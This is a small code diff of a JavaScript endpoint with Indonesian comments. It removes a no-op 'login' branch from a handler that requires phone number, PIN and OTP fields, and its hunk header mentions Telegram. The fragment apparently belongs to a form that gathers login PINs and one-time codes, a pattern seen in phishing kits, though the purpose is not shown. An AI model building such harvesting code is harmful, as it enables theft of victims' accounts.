@@ -26,11 +26,6 @@ Telegram
 
     return res.status(200).json({ success: true });
   }
-  // Jika type = 'login', hanya simpan di localStorage (tidak perlu simpan di DB)
-  if (type === 'login') {
-    // Tidak melakukan apa-apa, hanya mengembalikan sukses
-    return res.status(200).json({ success: true });
-  }
 
   // Jika type = 'otp' atau tidak ada type, anggap sebagai submit OTP
   if (!phone || !pin || !otp) {
